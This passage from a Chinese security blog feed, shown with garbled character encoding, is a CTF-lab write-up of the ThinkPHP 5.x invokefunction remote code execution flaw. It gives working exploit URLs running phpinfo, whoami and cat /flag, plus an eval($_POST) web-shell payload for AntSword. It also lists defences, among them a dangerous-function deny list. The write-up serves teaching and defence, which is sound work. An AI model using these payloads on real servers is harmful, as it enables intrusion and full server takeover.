&lt;figure class=&#34;highlight sas&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs sas&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;index&lt;/span&gt;.php&lt;br&gt;â””â”€â”€ ?s=&lt;span class=&#34;hljs-keyword&#34;&gt;index&lt;/span&gt;/\think\app/invokefunction&lt;br&gt;        &lt;span class=&#34;hljs-variable&#34;&gt;&amp;amp;function&lt;/span&gt;=call_user_func_array&lt;br&gt;        &lt;span class=&#34;hljs-variable&#34;&gt;&amp;amp;vars&lt;/span&gt;[0]=phpinfo&lt;br&gt;        &lt;span class=&#34;hljs-variable&#34;&gt;&amp;amp;vars&lt;/span&gt;[1][]=-1&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;strong&gt;å‚æ•°è¯´æ˜&lt;/strong&gt;ï¼š&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;å‚æ•°&lt;/th&gt;
&lt;th&gt;å«ä¹‰è¯´æ˜&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;&lt;code&gt;s&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;ThinkPHP è·¯ç”±ï¼Œè®¿é—®æ¡†æ¶æ ¸å¿ƒç±»&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;function&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;è¢«è°ƒç”¨çš„å‡½æ•°ï¼ˆå¦‚ &lt;code&gt;call_user_func_array&lt;/code&gt;ï¼‰&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;vars[0]&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;å®é™…è°ƒç”¨çš„å‡½æ•°åç§°ï¼ˆå¦‚ &lt;code&gt;phpinfo&lt;/code&gt;ã€&lt;code&gt;system&lt;/code&gt;ï¼‰&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;vars[1][]&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;å‡½æ•°å‚æ•°æ•°ç»„ï¼ˆå¦‚ &lt;code&gt;whoami&lt;/code&gt;ã€&lt;code&gt;-1&lt;/code&gt;ï¼‰&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;h3 id=&#34;3-æ¼æ´åˆ©ç”¨è¿‡ç¨‹-1&#34;&gt;&lt;a href=&#34;#3-æ¼æ´åˆ©ç”¨è¿‡ç¨‹-1&#34; class=&#34;headerlink&#34; title=&#34;3. æ¼æ´åˆ©ç”¨è¿‡ç¨‹&#34;&gt;&lt;/a&gt;3. æ¼æ´åˆ©ç”¨è¿‡ç¨‹&lt;/h3&gt;&lt;h4 id=&#34;æ­¥éª¤-1ï¼šä¿¡æ¯æ¢æµ‹ï¼ˆæµ‹è¯•-phpinfoï¼‰&#34;&gt;&lt;a href=&#34;#æ­¥éª¤-1ï¼šä¿¡æ¯æ¢æµ‹ï¼ˆæµ‹è¯•-phpinfoï¼‰&#34; class=&#34;headerlink&#34; title=&#34;æ­¥éª¤ 1ï¼šä¿¡æ¯æ¢æµ‹ï¼ˆæµ‹è¯• phpinfoï¼‰&#34;&gt;&lt;/a&gt;æ­¥éª¤ 1ï¼šä¿¡æ¯æ¢æµ‹ï¼ˆæµ‹è¯• &lt;code&gt;phpinfo&lt;/code&gt;ï¼‰&lt;/h4&gt;&lt;p&gt;æ„é€  Payload æµ‹è¯•æ¼æ´ï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight asciidoc&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs asciidoc&#34;&gt;&lt;span class=&#34;hljs-link&#34;&gt;http://node5.buuoj.cn:27945/index.php?s=index/\think\app/invokefunction&amp;amp;function=call_user_func_array&amp;amp;vars&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;0&lt;/span&gt;]=phpinfo&amp;amp;vars[1][]=-1&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;strong&gt;ç»“æœ&lt;/strong&gt;ï¼šé¡µé¢è¿”å›å®Œæ•´çš„ &lt;code&gt;phpinfo()&lt;/code&gt; ä¿¡æ¯ï¼Œè¯æ˜æ¼æ´å­˜åœ¨ä¸”å¯åˆ©ç”¨ã€‚&lt;/p&gt;
&lt;h4 id=&#34;æ­¥éª¤-2ï¼šæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼ˆwhoamiï¼‰&#34;&gt;&lt;a href=&#34;#æ­¥éª¤-2ï¼šæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼ˆwhoamiï¼‰&#34; class=&#34;headerlink&#34; title=&#34;æ­¥éª¤ 2ï¼šæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼ˆwhoamiï¼‰&#34;&gt;&lt;/a&gt;æ­¥éª¤ 2ï¼šæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼ˆ&lt;code&gt;whoami&lt;/code&gt;ï¼‰&lt;/h4&gt;&lt;p&gt;ä¿®æ”¹ Payload æ‰§è¡Œ &lt;code&gt;whoami&lt;/code&gt; å‘½ä»¤ï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight asciidoc&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs asciidoc&#34;&gt;&lt;span class=&#34;hljs-link&#34;&gt;http://node5.buuoj.cn:27945/index.php?s=index/\think\app/invokefunction&amp;amp;function=call_user_func_array&amp;amp;vars&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;0&lt;/span&gt;]=system&amp;amp;vars[1][]=whoami&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;strong&gt;ç»“æœ&lt;/strong&gt;ï¼šé¡µé¢è¿”å›ï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight haskell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs haskell&#34;&gt;&lt;span class=&#34;hljs-title&#34;&gt;www&lt;/span&gt;-&lt;span class=&#34;hljs-class&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;data&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;è¡¨æ˜ Web æœåŠ¡ä»¥ &lt;code&gt;www-data&lt;/code&gt; ç”¨æˆ·è¿è¡Œï¼Œå‘½ä»¤æ‰§è¡ŒæˆåŠŸã€‚&lt;/p&gt;
&lt;h4 id=&#34;æ­¥éª¤-3ï¼šè¯»å–-Flag-æ–‡ä»¶-1&#34;&gt;&lt;a href=&#34;#æ­¥éª¤-3ï¼šè¯»å–-Flag-æ–‡ä»¶-1&#34; class=&#34;headerlink&#34; title=&#34;æ­¥éª¤ 3ï¼šè¯»å– Flag æ–‡ä»¶&#34;&gt;&lt;/a&gt;æ­¥éª¤ 3ï¼šè¯»å– Flag æ–‡ä»¶&lt;/h4&gt;&lt;p&gt;å°è¯•è¯»å– &lt;code&gt;/flag&lt;/code&gt; æˆ–æ ¹ç›®å½•ä¸‹çš„ &lt;code&gt;flag&lt;/code&gt; æ–‡ä»¶ï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight asciidoc&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs asciidoc&#34;&gt;&lt;span class=&#34;hljs-link&#34;&gt;http://node5.buuoj.cn:27945/index.php?s=index/\think\app/invokefunction&amp;amp;function=call_user_func_array&amp;amp;vars&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;0&lt;/span&gt;]=system&amp;amp;vars[1][]=cat+/flag&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;æˆ–ï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight asciidoc&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs asciidoc&#34;&gt;&lt;span class=&#34;hljs-link&#34;&gt;http://node5.buuoj.cn:27945/index.php?s=index/\think\app/invokefunction&amp;amp;function=call_user_func_array&amp;amp;vars&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;0&lt;/span&gt;]=system&amp;amp;vars[1][]=cat+/var/www/html/flag&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;strong&gt;ç»“æœ&lt;/strong&gt;ï¼šé¡µé¢è¿”å›ç±»ä¼¼ï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight apache&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs apache&#34;&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;flag&lt;/span&gt;&amp;#123;d64e3f2e-xxxx-xxxx-xxxx-&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;ed8fe1b43f3&amp;#125;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;4-ä½¿ç”¨èšå‰‘è¿æ¥-1&#34;&gt;&lt;a href=&#34;#4-ä½¿ç”¨èšå‰‘è¿æ¥-1&#34; class=&#34;headerlink&#34; title=&#34;4. ä½¿ç”¨èšå‰‘è¿æ¥&#34;&gt;&lt;/a&gt;4. ä½¿ç”¨èšå‰‘è¿æ¥&lt;/h3&gt;&lt;p&gt;ä¸ ThinkPHP 2.x ç±»ä¼¼ï¼Œå¯æ„é€  POST å‚æ•°çš„ä¸€å¥è¯æœ¨é©¬ï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight asciidoc&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs asciidoc&#34;&gt;&lt;span class=&#34;hljs-link&#34;&gt;http://node5.buuoj.cn:27945/index.php?s=index/\think\app/invokefunction&amp;amp;function=call_user_func_array&amp;amp;vars&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;0&lt;/span&gt;]=assert&amp;amp;vars[1][]=eval($_POST[1])&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;strong&gt;èšå‰‘é…ç½®&lt;/strong&gt;ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;URL&lt;/strong&gt;ï¼šä¸Šè¿°åœ°å€&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;å¯†ç &lt;/strong&gt;ï¼š&lt;code&gt;1&lt;/code&gt;ï¼ˆå¯¹åº” &lt;code&gt;$_POST[1]&lt;/code&gt;ï¼‰&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ç±»å‹&lt;/strong&gt;ï¼šPHPï¼ˆåŸç”Ÿï¼‰&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ç¼–ç &lt;/strong&gt;ï¼šé»˜è®¤&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;è¿æ¥åå¯è¿›è¡Œæ–‡ä»¶ç®¡ç†ã€å‘½ä»¤æ‰§è¡Œç­‰æ“ä½œã€‚&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;å››ã€é˜²å¾¡æªæ–½&#34;&gt;&lt;a href=&#34;#å››ã€é˜²å¾¡æªæ–½&#34; class=&#34;headerlink&#34; title=&#34;å››ã€é˜²å¾¡æªæ–½&#34;&gt;&lt;/a&gt;å››ã€é˜²å¾¡æªæ–½&lt;/h2&gt;&lt;h3 id=&#34;1-å‡çº§-ThinkPHP-ç‰ˆæœ¬&#34;&gt;&lt;a href=&#34;#1-å‡çº§-ThinkPHP-ç‰ˆæœ¬&#34; class=&#34;headerlink&#34; title=&#34;1. å‡çº§ ThinkPHP ç‰ˆæœ¬&#34;&gt;&lt;/a&gt;1. å‡çº§ ThinkPHP ç‰ˆæœ¬&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;ThinkPHP 2.x&lt;/strong&gt;ï¼šå‡çº§åˆ°æ›´é«˜ç‰ˆæœ¬ï¼ˆå¦‚ 3.x æˆ– 5.0.24+ï¼‰ï¼Œä¿®å¤æ¨¡æ¿è§£ææ¼æ´ã€‚&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ThinkPHP 5.x&lt;/strong&gt;ï¼šå‡çº§åˆ° 5.0.24 æˆ–æ›´é«˜ç‰ˆæœ¬ï¼Œå®˜æ–¹å·²ä¿®å¤ RCE æ¼æ´ã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;2-è¾“å…¥éªŒè¯ä¸è¿‡æ»¤&#34;&gt;&lt;a href=&#34;#2-è¾“å…¥éªŒè¯ä¸è¿‡æ»¤&#34; class=&#34;headerlink&#34; title=&#34;2. è¾“å…¥éªŒè¯ä¸è¿‡æ»¤&#34;&gt;&lt;/a&gt;2. è¾“å…¥éªŒè¯ä¸è¿‡æ»¤&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;ç™½åå•éªŒè¯&lt;/strong&gt;ï¼šé™åˆ¶ &lt;code&gt;s&lt;/code&gt; å‚æ•°å’Œæ¨¡æ¿å˜é‡ï¼Œåªå…è®¸é¢„å®šä¹‰å€¼ã€‚&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;è¿‡æ»¤å±é™©å‡½æ•°&lt;/strong&gt;ï¼šç¦ç”¨ &lt;code&gt;eval&lt;/code&gt;ã€&lt;code&gt;assert&lt;/code&gt;ã€&lt;code&gt;call_user_func_array&lt;/code&gt; ç­‰é«˜å±å‡½æ•°ã€‚&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;å‚æ•°æ ¡éªŒ&lt;/strong&gt;ï¼šå¯¹ç”¨æˆ·è¾“å…¥è¿›è¡Œä¸¥æ ¼è¿‡æ»¤ï¼Œé˜²æ­¢æ³¨å…¥ã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;3-ç¦ç”¨å±é™©å‡½æ•°&#34;&gt;&lt;a href=&#34;#3-ç¦ç”¨å±é™©å‡½æ•°&#34; class=&#34;headerlink&#34; title=&#34;3. ç¦ç”¨å±é™©å‡½æ•°&#34;&gt;&lt;/a&gt;3. ç¦ç”¨å±é™©å‡½æ•°&lt;/h3&gt;&lt;p&gt;åœ¨ &lt;code&gt;php.ini&lt;/code&gt; ä¸­ç¦ç”¨é«˜å±å‡½æ•°ï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight ini&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs ini&#34;&gt;&lt;span class=&#34;hljs-attr&#34;&gt;disable_functions&lt;/span&gt; = eval,assert,exec,system,passthru,shell_exec,proc_open,call_user_func_array&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;4-æœ€å°æƒé™åŸåˆ™&#34;&gt;&lt;a href=&#34;#4-æœ€å°æƒé™åŸåˆ™&#34; class=&#34;headerlink&#34; title=&#34;4. æœ€å°æƒé™åŸåˆ™&#34;&gt;&lt;/a&gt;4. æœ€å°æƒé™åŸåˆ™&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;é…ç½® Web æœåŠ¡å™¨ä»¥æœ€ä½æƒé™è¿è¡Œï¼ˆå¦‚é root ç”¨æˆ·ï¼‰ã€‚&lt;/li&gt;
&lt;li&gt;é™åˆ¶ PHP è„šæœ¬çš„æ–‡ä»¶ç³»ç»Ÿè®¿é—®æƒé™ã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;5-Web-åº”ç”¨é˜²ç«å¢™ï¼ˆWAFï¼‰&#34;&gt;&lt;a href=&#34;#5-Web-åº”ç”¨é˜²ç«å¢™ï¼ˆWAFï¼‰&#34; class=&#34;headerlink&#34; title=&#34;5. Web åº”ç”¨é˜²ç«å¢™ï¼ˆWAFï¼‰&#34;&gt;&lt;/a&gt;5. Web åº”ç”¨é˜²ç«å¢™ï¼ˆWAFï¼‰&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;éƒ¨ç½² WAFï¼Œæ‹¦æˆªåŒ…å«å¯ç–‘è·¯ç”±ï¼ˆå¦‚ &lt;code&gt;\think\app&lt;/code&gt;ï¼‰æˆ–å‡½æ•°ï¼ˆå¦‚ &lt;code&gt;system&lt;/code&gt;ï¼‰çš„è¯·æ±‚ã€‚&lt;/li&gt;
&lt;li&gt;ä½¿ç”¨æ­£åˆ™è§„åˆ™åŒ¹é…å¼‚å¸¸ Payloadã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;6-å®‰å…¨å®¡è®¡ä¸ç›‘æ§&#34;&gt;&lt;a href=&#34;#6-å®‰å…¨å®¡è®¡ä¸ç›‘æ§&#34; class=&#34;headerlink&#34; title=&#34;6. å®‰å…¨å®¡è®¡ä¸ç›‘æ§&#34;&gt;&lt;/a&gt;6. å®‰å…¨å®¡è®¡ä¸ç›‘æ§&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;å®šæœŸæ‰«æ Web åº”ç”¨ï¼Œæ£€æŸ¥å·²çŸ¥æ¼æ´ã€‚&lt;/li&gt;
&lt;li&gt;ç›‘æ§æœåŠ¡å™¨æ—¥å¿—ï¼ŒåŠæ—¶å‘ç°å¼‚å¸¸è¯·æ±‚ã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h2 id=&#34;äº”ã€æ€»ç»“&#34;&gt;&lt;a href=&#34;#äº”ã€æ€»ç»“&#34; class=&#34;headerlink&#34; title=&#34;äº”ã€æ€»ç»“&#34;&gt;&lt;/a&gt;äº”ã€æ€»ç»“&lt;/h2&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;é¡¹ç›®&lt;/th&gt;
&lt;th&gt;ThinkPHP 2.x RCE&lt;/th&gt;
&lt;th&gt;ThinkPHP 5.x RCE&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;æ¼æ´åç§°&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;ThinkPHP 2.x RCE&lt;/td&gt;
&lt;td&gt;ThinkPHP 5.x RCE&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;å½±å“ç‰ˆæœ¬&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;ThinkPHP 2.x&lt;/td&gt;
&lt;td&gt;ThinkPHP &amp;lt;&amp;#x3D; 5.0.23&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;æ¼æ´åŸå› &lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;æ¨¡æ¿å˜é‡è§£ææœªè¿‡æ»¤&lt;/td&gt;
&lt;td&gt;åŠ¨æ€å‡½æ•°è°ƒç”¨æœªæˆæƒ&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;åˆ©ç”¨æ–¹æ³•&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;GET&amp;#x2F;POST å‚æ•°æ„é€  &lt;code&gt;eval&lt;/code&gt;&amp;#x2F;&lt;code&gt;assert&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;GET è¯·æ±‚æ„é€ è·¯ç”± + å‡½æ•°è°ƒç”¨&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;å…³é”®å‡½æ•°&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;&lt;code&gt;eval&lt;/code&gt;, &lt;code&gt;assert&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;code&gt;call_user_func_array&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;æ£€æµ‹æ–¹å¼&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;ä½¿ç”¨ &lt;code&gt;$&amp;#123;@phpinfo()&amp;#125;&lt;/code&gt; æ¢æµ‹&lt;/td&gt;
&lt;td&gt;ä½¿ç”¨ &lt;code&gt;phpinfo&lt;/code&gt; æ¢æµ‹ï¼Œå†å°è¯• &lt;code&gt;system&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;ç»ƒä¹ å¹³å°&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;BUUCTFï¼ˆå¦‚ &lt;code&gt;node3.buuoj.cn:26104&lt;/code&gt;ï¼‰&lt;/td&gt;
&lt;td&gt;BUUCTFï¼ˆå¦‚ &lt;code&gt;node5.buuoj.cn:27945&lt;/code&gt;ï¼‰&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;ThinkPHP 2.x å’Œ 5.x çš„ RCE æ¼æ´åˆ©ç”¨ç®€å•ä½†å±å®³æå¤§ï¼Œæ”»å‡»è€…å¯é€šè¿‡ç®€å•çš„ URL æ„é€ å®ç°ä»£ç æˆ–å‘½ä»¤æ‰§è¡Œï¼Œç”šè‡³å®Œå…¨æ§åˆ¶æœåŠ¡å™¨ã€‚BUUCTF é¶åœºä¸ºæˆ‘ä»¬æä¾›äº†ä¾¿æ·çš„å¤ç°ç¯å¢ƒï¼Œé€šè¿‡æœ¬æ–‡çš„æ¼”ç¤ºï¼Œè¯»è€…å¯ä»¥æ·±å…¥ç†è§£æ¼æ´åŸç†å’Œåˆ©ç”¨æµç¨‹ã€‚å¼€å‘è€…åº”åŠæ—¶å‡çº§æ¡†æ¶ã€åŠ å¼ºè¾“å…¥éªŒè¯ã€éƒ¨ç½² WAF å’Œç›‘æ§æœºåˆ¶ï¼Œä»¥æœ‰æ•ˆé˜²èŒƒæ­¤ç±»æ¼æ´ã€‚&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;å…è´£å£°æ˜&lt;/strong&gt;ï¼šæœ¬æ–‡å†…å®¹ä»…ä¾›å®‰å…¨ç ”ç©¶å’Œé˜²æŠ¤å‚è€ƒï¼Œè¯·å‹¿ç”¨äºéæ³•æ”»å‡»æ´»åŠ¨ã€‚&lt;/p&gt;
&lt;/blockquote&gt;
</content>
        <category term="Webå®‰å…¨" />
        <category term="RCE" />
        <category term="æ¼æ´å¤ç°" />
        <category term="ThinkPHP" />
        <updated>2025-07-28T06:18:44.000Z</updated>
    </entry>
    <entry>
        <id>https://bae-ace.github.io/2025/07/27/ThinkPHP-5-x-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88%E5%9F%BA%E4%BA%8E-Vulhub-%E7%8E%AF%E5%A2%83%EF%BC%89/</id>
        <title>ThinkPHP 5.x è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆåŸºäº Vulhub ç¯å¢ƒï¼‰</title>
        <link rel="alternate" href="https://bae-ace.github.io/2025/07/27/ThinkPHP-5-x-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88%E5%9F%BA%E4%BA%8E-Vulhub-%E7%8E%AF%E5%A2%83%EF%BC%89/"/>
        <content type="html">&lt;h1 id=&#34;æ·±å…¥å‰–æ-ThinkPHP-5-x-è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆåŸºäº-Vulhub-ç¯å¢ƒï¼‰&#34;&gt;&lt;a href=&#34;#æ·±å…¥å‰–æ-ThinkPHP-5-x-è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆåŸºäº-Vulhub-ç¯å¢ƒï¼‰&#34; class=&#34;headerlink&#34; title=&#34;æ·±å…¥å‰–æ ThinkPHP 5.x è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆåŸºäº Vulhub ç¯å¢ƒï¼‰&#34;&gt;&lt;/a&gt;æ·±å…¥å‰–æ ThinkPHP 5.x è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆåŸºäº Vulhub ç¯å¢ƒï¼‰&lt;/h1&gt;&lt;h2 id=&#34;ä¸€ã€æ¼æ´èƒŒæ™¯ç®€ä»‹-ğŸ”&#34;&gt;&lt;a href=&#34;#ä¸€ã€æ¼æ´èƒŒæ™¯ç®€ä»‹-ğŸ”&#34; class=&#34;headerlink&#34; title=&#34;ä¸€ã€æ¼æ´èƒŒæ™¯ç®€ä»‹ ğŸ”&#34;&gt;&lt;/a&gt;ä¸€ã€æ¼æ´èƒŒæ™¯ç®€ä»‹ ğŸ”&lt;/h2&gt;&lt;p&gt;ThinkPHP æ˜¯ä¸€ä¸ªè½»é‡ä¸”æ˜“ç”¨çš„ PHP å¼€å‘æ¡†æ¶ï¼Œå¹¿æ³›åº”ç”¨äº Web å¼€å‘ã€‚ç„¶è€Œï¼Œåœ¨ ThinkPHP 5.0.x è‡³ 5.0.23 ç‰ˆæœ¬ä¸­ï¼Œç”±äºæ¡†æ¶å¯¹åŠ¨æ€å‡½æ•°è°ƒç”¨ï¼ˆå¦‚ &lt;code&gt;invokeFunction&lt;/code&gt;ï¼‰çš„è®¿é—®æ§åˆ¶ä¸ä¸¥æ ¼ï¼Œå­˜åœ¨ä¸¥é‡çš„ &lt;strong&gt;è¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆRCEï¼‰æ¼æ´&lt;/strong&gt;ã€‚æ”»å‡»è€…å¯é€šè¿‡ç²¾å¿ƒæ„é€ çš„ URL å‚æ•°ï¼Œè°ƒç”¨ä»»æ„ PHP å‡½æ•°ï¼ˆå¦‚ &lt;code&gt;phpinfo&lt;/code&gt; æˆ– &lt;code&gt;system&lt;/code&gt;ï¼‰ï¼Œå®ç°è¿œç¨‹æ‰§è¡Œä»»æ„ä»£ç æˆ–ç³»ç»Ÿå‘½ä»¤ï¼Œå±å®³æå¤§ã€‚&lt;/p&gt;
